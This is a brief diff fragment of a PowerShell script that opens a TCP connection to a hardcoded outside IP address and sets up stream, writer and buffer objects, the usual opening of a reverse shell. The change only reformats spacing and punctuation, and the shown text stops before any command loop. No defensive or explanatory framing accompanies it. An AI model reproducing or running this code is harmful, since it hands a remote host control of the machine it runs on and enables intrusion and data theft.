@@ -1,5 +1,5 @@
-$socket = new-object System.Net.Sockets.TcpClient('18.220.142.224', 80);
-if($socket -eq $null){exit 1}
+$socket = new-object System.Net.Sockets.TcpClient('18.220.142.224',80);
+if($socket -eq $null){exit 1};
 $stream = $socket.GetStream();
 $writer = new-object System.IO.StreamWriter($stream);
 $buffer = new-object System.Byte[] 1024;
